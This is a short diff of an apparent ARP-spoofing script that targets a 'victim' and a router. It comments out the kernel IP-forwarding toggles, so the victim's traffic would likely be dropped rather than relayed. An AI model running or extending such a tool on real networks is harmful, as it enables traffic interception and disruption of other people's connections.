@@ -45,12 +45,12 @@ def main(args):
        sys.exit("Could not find victim MAC address. Closing...")
 
     #Kernel to forward packets to victim/router
-    with open('/proc/sys/net/ipv4/ip_forward', 'w') as ipf:
-       ipf.write('1\n')
+#    with open('/proc/sys/net/ipv4/ip_forward', 'w') as ipf:
+#       ipf.write('1\n')
 
     def signal_handler(signal, frame):
-        with open('/proc/sys/net/ipv4/ip_forward', 'w') as ipf:
-           ipf.write('0\n')
+#        with open('/proc/sys/net/ipv4/ip_forward', 'w') as ipf:
+#           ipf.write('0\n')
 
         restore(routerIP, victimIP, routerMAC, victimMAC)
     signal.signal(signal.SIGINT, signal_handler)
